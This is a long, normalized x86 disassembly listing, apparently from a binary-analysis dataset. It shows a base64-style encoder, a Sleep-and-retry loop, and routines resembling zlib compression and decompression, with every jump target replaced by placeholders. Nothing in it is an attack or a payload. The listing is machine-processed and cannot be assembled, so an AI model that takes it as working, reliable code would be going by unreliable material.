xor edx edx
mov dh [ esi ]
add esi 0x3
mov dl [ esi - 0x2 ]
shl edx 0x8
or edi edx
mov edx edi
shr edx 0x12
and edx ecx
mov dl [ edx + r--data ]
mov [ eax ] dl
mov edx edi
shr edx 0xc
and edx ecx
mov dl [ edx + r--data ]
mov [ eax + 0x1 ] dl
mov edx edi
shr edx 0x6
and edx ecx
mov dl [ edx + r--data ]
and edi ecx
mov [ eax + 0x2 ] dl
mov dl [ edi + r--data ]
mov [ eax + 0x3 ] dl
add eax 0x4
dec [ esp + 0x14 ]
jne r-xdata
mov esi rw-data
push esi
mov [ eax ] 0x0
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
mov esi rw-data
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
and [ esp + 0x14 ] 0x0
mov edi [ esp + 0x40 ]
mov [ esp + 0x13 ] 0x0
cmp [ esp + 0x13 ] 0x0
jne r-xdata
push [ esp + 0x34 ]
mov ecx [ esp + 0x34 ]
mov eax ebx
call sub_403e29
test eax eax
jg r-xdata
push edi
call [ lstrlenA@IAT ]
mov ecx eax
lea eax [ ecx - 0x1 ]
cmp eax 0xf9fffe
ja r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov eax [ esp + 0x14 ]
inc [ esp + 0x14 ]
cmp eax 0x3
jg r-xdata
push [ esp + 0x54 ]
mov ecx [ esp + 0x54 ]
lea eax [ esp + 0x1c ]
call sub_403e29
test eax eax
jle r-xdata
lea esi [ esp + 0x18 ]
call sub_403d42
jmp r-xdata
lea esi [ esp + 0x18 ]
call sub_403d42
cmp [ esp + 0x13 ] 0x0
je r-xdata
mov esi [ ebp + 0x10 ]
mov eax ecx
imul eax eax 0x3
cdq
and edx 0x3
add eax edx
mov ebx eax
sar ebx 0x2
lea eax [ ebx + 0x10 ]
cmp eax [ esi ]
jg r-xdata
mov [ esp + 0x6c ] 0x2
lea esi [ esp + 0x18 ]
call sub_403d42
mov [ esp + 0x6c ] 0x1
cmp [ esp + 0x50 ] 0x0
je r-xdata
jmp r-xdata
test edi edi
je r-xdata
lea ebx [ esp + 0x18 ]
call sub_403b55
test al al
je r-xdata
and [ esi ] 0x0
mov eax [ ebp + 0xc ]
push ecx
mov ecx edi
mov [ esp + 0x17 ] 0x1
call sub_401000
test al al
je r-xdata
mov [ esp + 0x6c ] 0x0
test edi edi
je r-xdata
call sub_402a24
push [ esp + 0x50 ]
call sub_40391f
mov esi 0x80
mov [ esp + 0x48 ] esi
call sub_402a24
mov eax esi
call sub_4038dd
and [ esp + 0x44 ] 0x0
push 0x1
push 0x3ea000
lea esi [ esp + 0x48 ]
mov [ esp + 0x48 ] eax
call sub_4039b5
test al al
jne r-xdata
call sub_402a24
push edi
call sub_40391f
inc ebx
mov [ esi ] ebx
jmp r-xdata
or [ esp + 0x6c ] 0xffffffff
cmp [ esp + 0x30 ] 0x0
je r-xdata
call sub_402a24
push edi
call sub_40391f
cmp [ esp + 0x21 ] 0x0
mov edi [ esp + 0x40 ]
je r-xdata
lea esi [ esp + 0x18 ]
call sub_403d42
mov edi [ esp + 0x40 ]
jmp r-xdata
mov ecx [ esp + 0x64 ]
mov al [ esp + 0x13 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
call sub_402a24
push [ esp + 0x30 ]
call sub_40391f
mov ebx [ esp + 0x44 ]
lea esi [ esp + 0x18 ]
call sub_403d42
cmp [ esp + 0x21 ] 0x0
mov [ ebx + edi - 0x1 ] 0x0
je r-xdata
push ebx
push edi
lea eax [ esp + 0x20 ]
push eax
mov [ edi ] 0x0
call sub_403db4
test eax eax
jle r-xdata
mov al [ edi ]
cmp al 0xa
je r-xdata
push edi
mov [ ebx + edi - 0x1 ] 0x0
call [ lstrlenA@IAT ]
cmp eax 0x8
jle r-xdata
cmp [ esp + 0x21 ] 0x0
je r-xdata
cmp al 0xd
je r-xdata
mov [ esp + 0x13 ] 0x1
test al al
jne r-xdata
push ebx
push edi
lea eax [ esp + 0x20 ]
push eax
mov [ edi ] 0x0
call sub_403db4
test eax eax
jle r-xdata
jmp r-xdata
sub_405c30
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x3c ]
push esi
push edi
mov edi [ esp + 0x48 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] eax
mov eax [ edi ]
push 0x38
lea ecx [ esp + 0xc ]
push rw-data
push ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
call sub_405e80
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x38
retn
lea edx [ esp + 0x8 ]
push 0x4
push edx
call sub_405ea0
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x8 ]
push edx
mov [ edi ] ecx
call sub_405d20
add esp 0x4
lea eax [ esp + 0x8 ]
push eax
call sub_405d20
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
add esp 0x38
retn
sub_405cd0
mov eax [ esp + 0x4 ]
xor edx edx
cmp eax edx
je r-xdata
mov eax 0xfffffffe
retn
mov ecx [ eax + 0x1c ]
cmp ecx edx
je r-xdata
push esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] edx
mov esi [ ecx + 0xc ]
push edx
neg esi
sbb esi esi
push eax
and esi 0x7
mov [ ecx ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_406f30
add esp 0xc
xor eax eax
pop esi
retn
sub_405d20
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ esi + 0x1c ] 0x0
xor eax eax
pop esi
retn
push esi
push eax
call sub_407d60
add esp 0x8
sub_405d70
mov eax [ esp + 0xc ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
mov eax 0xfffffffa
pop esi
retn
mov al [ eax ]
mov cl [ rw-data ]
cmp al cl
jne r-xdata
cmp [ esp + 0x18 ] 0x38
jne r-xdata
mov esi [ esp + 0xc ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] edi
cmp eax edi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
cmp [ esi + 0x24 ] edi
jne r-xdata
mov [ esi + 0x20 ] sub_407ed0
mov [ esi + 0x28 ] edi
mov ecx [ esi + 0x28 ]
push 0x18
push 0x1
push ecx
call [ esi + 0x20 ]
add esp 0xc
cmp eax edi
mov [ esi + 0x1c ] eax
jne r-xdata
mov [ esi + 0x24 ] sub_407ef0
mov ecx [ esp + 0x10 ]
mov [ eax + 0x14 ] edi
mov edx [ esi + 0x1c ]
cmp ecx edi
mov [ edx + 0xc ] edi
jge r-xdata
pop edi
mov eax 0xfffffffc
pop esi
retn
cmp ecx 0x8
jl r-xdata
mov eax [ esi + 0x1c ]
neg ecx
mov [ eax + 0xc ] 0x1
push esi
call sub_405d20
add esp 0x4
mov eax 0xfffffffe
pop edi
pop esi
retn
cmp ecx 0xf
jg r-xdata
mov edx [ esi + 0x1c ]
mov eax 0x1
shl eax cl
mov [ edx + 0x10 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ ecx + 0xc ]
neg edx
sbb edx edx
push eax
not edx
and edx sub_407da0
push edx
push esi
call sub_406fb0
mov ecx [ esi + 0x1c ]
add esp 0xc
mov [ ecx + 0x14 ] eax
mov edx [ esi + 0x1c ]
push esi
cmp [ edx + 0x14 ] edi
jne r-xdata
call sub_405cd0
add esp 0x4
xor eax eax
pop edi
pop esi
retn
call sub_405d20
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
retn
sub_405ea0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
xor ebx ebx
cmp edx 0x4
mov edi 0xfffffffb
setne bl
dec ebx
mov ebp 0x5
and ebx 0xfffffffb
mov [ esp + 0x18 ] ebx
jmp [ ecx * 4 + jump_table_406298 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax + 0x14 ]
push edi
push esi
push ecx
call sub_407050
mov edi eax
add esp 0xc
cmp edi 0xfffffffd
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
dec ecx
xor edx edx
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
inc ecx
mov edi ebx
mov [ esi + 0x8 ] ecx
mov ecx [ esi ]
mov dl [ ecx ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0x1c ]
mov edx [ esi ]
mov ecx [ eax + 0x4 ]
and ecx 0xf
inc edx
cmp cl 0x8
mov [ esi ] edx
je r-xdata
dec eax
xor ecx ecx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
mov edi ebx
mov ebx [ esi + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ esi ]
xor edx edx
mov ebp 0x1f
mov cl [ eax ]
inc eax
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
shl eax 0x8
add eax ecx
div ebp
test edx edx
je r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
dec eax
mov edx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi ]
mov edi ebx
mov cl [ eax ]
shl ecx 0x18
mov [ edx + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0x9
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x10
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xa
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xb
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edi ebx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
xor edx edx
mov [ esi + 0x4 ] eax
mov dl [ ecx ]
mov eax [ esi + 0x1c ]
mov edi ebx
shl edx 0x18
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov ecx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ ecx ] 0x3
mov edx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov cl [ edx ]
mov edi ebx
mov edx [ eax + 0x8 ]
shl ecx 0x10
add edx ecx
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov edx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ edx ] 0x4
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor edx edx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] ebp
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
pop edi
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x8 ]
mov [ esi + 0x30 ] ecx
pop esi
mov [ eax ] 0x6
pop ebp
mov eax 0x2
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x10 ]
shr ecx 0x4
add ecx 0x8
cmp ecx edx
jbe r-xdata
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
test cl 0x20
jne r-xdata
mov [ ebx ] 0xd
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] ebp
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi ebx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
cmp ecx 0xd
ja r-xdata
mov ecx [ esi + 0x1c ]
mov [ ecx ] 0xc
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov [ eax ] 0x1
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ eax ] 0x2
mov [ ebx ] 0x7
mov ebx [ esp + 0x18 ]
mov ebp 0x5
jmp r-xdata
mov eax [ esi + 0x1c ]
mov edi ebx
mov edx [ eax + 0x14 ]
lea ecx [ eax + 0x4 ]
push ecx
push esi
push edx
call sub_406f30
mov eax [ esi + 0x1c ]
add esp 0xc
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ eax ] 0x8
mov [ eax ] 0xc
jmp r-xdata
sub_4062d0
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax + 0x1c ]
mov ecx [ eax + 0x10 ]
mov edx [ esi + 0x14 ]
cmp edx ecx
jbe r-xdata
test edx edx
je r-xdata
mov edx ecx
pop esi
retn
mov esi [ esi + 0x10 ]
mov ecx edx
push ebx
mov ebx ecx
push edi
mov edi [ eax + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ eax + 0x1c ]
add edi edx
mov [ eax + 0xc ] edi
mov esi [ ecx + 0x10 ]
add esi edx
mov [ ecx + 0x10 ] esi
mov ebx [ eax + 0x14 ]
mov edi [ eax + 0x10 ]
mov ecx [ eax + 0x1c ]
add ebx edx
sub edi edx
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] edi
mov esi [ ecx + 0x14 ]
pop edi
sub esi edx
pop ebx
mov [ ecx + 0x14 ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
mov [ eax + 0x10 ] ecx
sub_406350
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ebx 0xffff
mov eax [ esi + 0xc ]
add eax 0xfffffffb
cmp eax ebx
jae r-xdata
mov ebp [ esp + 0x14 ]
mov ebx eax
mov ecx [ esi + 0x64 ]
mov [ esi + 0x6c ] 0x0
add ecx eax
mov [ esi + 0x64 ] ecx
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x64 ]
lea eax [ ecx + ebx ]
je r-xdata
push esi
call sub_4064b0
mov eax [ esi + 0x6c ]
add esp 0x4
test eax eax
jne r-xdata
sub edx eax
mov [ esi + 0x64 ] eax
test ecx ecx
mov [ esi + 0x6c ] edx
jl r-xdata
cmp edx eax
jb r-xdata
test ebp ebp
je r-xdata
xor edx edx
mov edx [ esi + 0x30 ]
add edx ecx
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx ecx
sub eax 0x106
cmp edx eax
jb r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
test eax eax
je r-xdata
sub eax ecx
push 0x0
push eax
push edx
push esi
call sub_408010
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_4062d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x1
ja r-xdata
test ecx ecx
jl r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
jmp r-xdata
push 0x0
push edx
push eax
push esi
call sub_408010
mov edx [ esi ]
mov ecx [ esi + 0x64 ]
push edx
mov [ esi + 0x54 ] ecx
call sub_4062d0
mov eax [ esi ]
add esp 0x14
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov eax ebp
pop esi
sub eax 0x4
pop ebp
neg eax
sbb eax eax
pop ebx
and al 0xfe
add eax 0x3
retn
xor eax eax
cmp ebp 0x4
setne al
dec eax
pop esi
pop ebp
and eax 0x2
pop ebx
retn
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_408010
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_4062d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
sub_4064b0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov ebp [ ebx + 0x24 ]
push edi
cmp edx 0xffffffff
jne r-xdata
test eax eax
jne r-xdata
mov ecx [ ebx + 0x24 ]
lea ecx [ ecx + ebp - 0x106 ]
cmp eax ecx
jb r-xdata
mov edx 0xfffffffe
jmp r-xdata
test ecx ecx
jne r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edi [ ebx + 0x30 ]
mov ecx ebp
mov eax ecx
lea esi [ edi + ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebx + 0x68 ]
mov ecx [ ebx + 0x64 ]
mov eax [ ebx + 0x54 ]
sub esi ebp
sub ecx ebp
mov [ ebx + 0x68 ] esi
mov esi [ ebx + 0x44 ]
mov [ ebx + 0x64 ] ecx
mov ecx [ ebx + 0x3c ]
sub eax ebp
mov [ ebx + 0x54 ] eax
lea ecx [ ecx + esi * 2 ]
mov edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ ebx + 0x6c ]
mov esi [ ebx + 0x64 ]
push edx
mov edx [ ebx + 0x30 ]
add ecx esi
add ecx edx
push ecx
push eax
call sub_4065e0
mov ecx [ ebx + 0x6c ]
add esp 0xc
add ecx eax
mov esi ecx
mov [ ebx + 0x6c ] ecx
cmp esi 0x3
jb r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
cmp esi 0x106
jae r-xdata
mov edx [ ebx + 0x64 ]
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x50 ]
lea edi [ edx + eax ]
xor eax eax
mov al [ edi ]
mov [ ebx + 0x40 ] eax
shl eax cl
xor ecx ecx
mov cl [ edi + 0x1 ]
xor eax ecx
mov ecx [ ebx + 0x4c ]
and eax ecx
mov [ ebx + 0x40 ] eax
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
mov eax [ ebx + 0x38 ]
mov esi ebp
lea ecx [ eax + ebp * 2 ]
dec esi
mov [ ecx ] ax
jne r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
sub eax ebp
jmp r-xdata
mov eax [ ebx + 0x64 ]
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x6c ]
sub edx eax
sub edx ecx
jne r-xdata
sub ecx 0x2
xor eax eax
mov ax [ ecx ]
cmp eax ebp
jb r-xdata
add edx ebp
dec esi
mov [ ecx ] ax
jne r-xdata
sub_4065e0
mov ecx [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov eax [ ebp + 0x4 ]
mov ebx eax
cmp ebx ecx
jbe r-xdata
test ebx ebx
jne r-xdata
mov ebx ecx
sub eax ebx
mov [ ebp + 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
pop ebp
xor eax eax
pop ebx
retn
mov ecx ebx
push esi
mov esi [ ebp ]
mov eax ecx
push edi
mov edi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp ]
mov eax [ ebp + 0x8 ]
add ecx ebx
add eax ebx
pop edi
mov [ ebp ] ecx
mov [ ebp + 0x8 ] eax
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov ecx [ ebp ]
mov edx [ ebp + 0x30 ]
push ebx
push ecx
push edx
call sub_407da0
add esp 0xc
mov [ ebp + 0x30 ] eax
sub_406660
push ecx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
cmp eax 0x3
jb r-xdata
push esi
call sub_4064b0
mov eax [ esi + 0x6c ]
add esp 0x4
cmp eax 0x106
jae r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x50 ]
mov edx [ esi + 0x64 ]
mov edi [ esi + 0x30 ]
shl eax cl
xor ecx ecx
mov cl [ edi + edx + 0x2 ]
mov edi [ esi + 0x4c ]
xor eax ecx
mov ecx [ esi + 0x3c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov eax [ esi + 0x2c ]
mov ecx [ esi + 0x38 ]
and eax edx
mov [ ecx + eax * 2 ] di
mov edx [ esi + 0x40 ]
mov eax [ esi + 0x3c ]
mov cx [ esi + 0x64 ]
mov [ eax + edx * 2 ] cx
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x58 ]
cmp eax 0x3
jb r-xdata
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x24 ]
sub edx edi
sub eax 0x106
cmp edx eax
ja r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebp
pop ecx
retn
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x1698 ]
mov al [ edx + eax ]
mov edx [ esi + 0x169c ]
mov [ esp + 0xc ] al
mov [ edx + ecx * 2 ] 0x0
mov ecx [ esi + 0x1690 ]
mov edx [ esi + 0x1698 ]
mov [ ecx + edx ] al
mov eax [ esp + 0xc ]
mov ebp [ esi + 0x1698 ]
and eax 0xff
inc ebp
xor edx edx
lea eax [ esi + eax * 4 + 0x8c ]
mov [ esi + 0x1698 ] ebp
inc [ eax ]
mov ecx [ esi + 0x1694 ]
mov ebp [ esi + 0x1698 ]
dec ecx
cmp ebp ecx
mov ecx [ esi + 0x6c ]
sete dl
dec ecx
mov ebp edx
mov [ esi + 0x6c ] ecx
mov edx [ esi + 0x1698 ]
mov ebp [ esi + 0x169c ]
mov cl al
mov ax [ esi + 0x64 ]
sub ax [ esi + 0x68 ]
sub cl 0x3
mov [ esp + 0x14 ] cl
mov [ ebp + edx * 2 ] ax
mov edx [ esi + 0x1690 ]
mov ebp [ esi + 0x1698 ]
add eax 0xffff
mov [ edx + ebp ] cl
mov edx [ esi + 0x1698 ]
mov ecx [ esp + 0x14 ]
inc edx
mov [ esi + 0x1698 ] edx
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
inc [ esi + edx * 4 + 0x490 ]
cmp ax 0x100
lea ecx [ esi + edx * 4 + 0x490 ]
jae r-xdata
cmp [ esi + 0x80 ] 0x2
je r-xdata
xor eax eax
mov eax [ esi + 0x30 ]
add eax ecx
jmp r-xdata
mov eax [ esi + 0x6c ]
cmp eax 0x106
jae r-xdata
mov ecx [ esi + 0x54 ]
test ecx ecx
jl r-xdata
and eax 0xffff
shr eax 0x7
xor edx edx
mov dl [ eax + r--data ]
mov eax edx
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov eax ecx
jmp r-xdata
push edi
push esi
call sub_406990
add esp 0x8
mov [ esi + 0x58 ] eax
mov eax [ esp + 0x18 ]
pop edi
sub eax 0x4
pop esi
neg eax
sbb eax eax
pop ebp
and al 0xfe
add eax 0x3
pop ecx
retn
mov esi ebp
xor eax eax
cmp esi 0x4
pop edi
setne al
dec eax
pop esi
and eax 0x2
pop ebp
pop ecx
retn
mov ebp [ esp + 0x18 ]
xor edx edx
cmp ebp 0x4
sete dl
push edx
mov edx [ esi + 0x64 ]
sub edx ecx
push edx
push eax
push esi
call sub_408010
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_4062d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
jne r-xdata
xor eax eax
mov edx [ esi + 0x30 ]
mov eax ecx
add eax edx
jmp r-xdata
mov ecx [ esi + 0x64 ]
mov edx [ esi + 0x30 ]
add ecx eax
xor eax eax
add edx ecx
mov [ esi + 0x64 ] ecx
mov ecx [ esi + 0x50 ]
mov [ esi + 0x58 ] 0x0
mov al [ edx ]
mov [ esi + 0x40 ] eax
shl eax cl
xor ecx ecx
mov cl [ edx + 0x1 ]
xor eax ecx
mov ecx [ esi + 0x4c ]
and eax ecx
mov [ esi + 0x40 ] eax
jmp r-xdata
cmp ecx 0x3
jb r-xdata
inc [ esi + eax * 4 + 0x980 ]
mov eax [ esi + 0x1694 ]
mov edx [ esi + 0x1698 ]
dec eax
xor ecx ecx
cmp edx eax
mov eax [ esi + 0x58 ]
mov edx [ esi + 0x78 ]
sete cl
mov ebp ecx
mov ecx [ esi + 0x6c ]
sub ecx eax
cmp eax edx
mov [ esi + 0x6c ] ecx
ja r-xdata
jmp r-xdata
mov edx [ esi + 0x64 ]
push 0x0
sub edx ecx
push edx
push eax
push esi
call sub_408010
mov ecx [ esi ]
mov eax [ esi + 0x64 ]
push ecx
mov [ esi + 0x54 ] eax
call sub_4062d0
mov edx [ esi ]
add esp 0x14
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
test ebp ebp
je r-xdata
dec eax
mov [ esi + 0x58 ] eax
mov edx [ esi + 0x64 ]
mov eax [ esi + 0x30 ]
mov edi [ esi + 0x40 ]
inc edx
xor ecx ecx
mov [ esi + 0x64 ] edx
mov cl [ edx + eax + 0x2 ]
mov eax ecx
mov ecx [ esi + 0x50 ]
shl edi cl
mov ecx [ esi + 0x3c ]
xor eax edi
mov edi [ esi + 0x4c ]
and eax edi
xor edi edi
mov [ esi + 0x40 ] eax
mov di [ ecx + eax * 2 ]
mov ecx [ esi + 0x2c ]
mov eax [ esi + 0x38 ]
and edx ecx
